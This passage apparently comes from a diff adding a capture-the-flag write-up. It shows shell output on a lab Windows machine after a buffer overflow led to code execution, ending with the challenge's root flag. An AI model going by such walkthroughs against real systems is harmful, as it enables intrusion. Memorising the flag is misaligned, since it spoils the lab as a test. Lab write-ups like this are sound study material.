+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>
+```
+
+**root.txt is in C:\users\mayor\desktop**
+
+```
+C:\Windows\system32> cd C:\Users\mayor\Desktop
+
+C:\Users\mayor\Desktop> dir
+ Volume in drive C has no label.
+ Volume Serial Number is 3ABE-D44B
+
+ Directory of C:\Users\mayor\Desktop
+
+05/14/2020  09:58 PM    <DIR>          .
+05/14/2020  09:58 PM    <DIR>          ..
+05/14/2020  09:21 PM                27 root.txt.txt
+               1 File(s)             27 bytes
+               2 Dir(s)  16,388,218,880 bytes free
+
+C:\Users\mayor\Desktop> cat root.txt.txt
+'cat' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Users\mayor\Desktop> type root.txt.txt
+{Th3_M4y0r_C0ngr4tul4t3s_U}
+C:\Users\mayor\Desktop>
+```
+
+**Amazing buffer overflow challenge did buffer overflow -> rce for very first time it was cool.. fucking cool.. gud lab.. thankyou..**
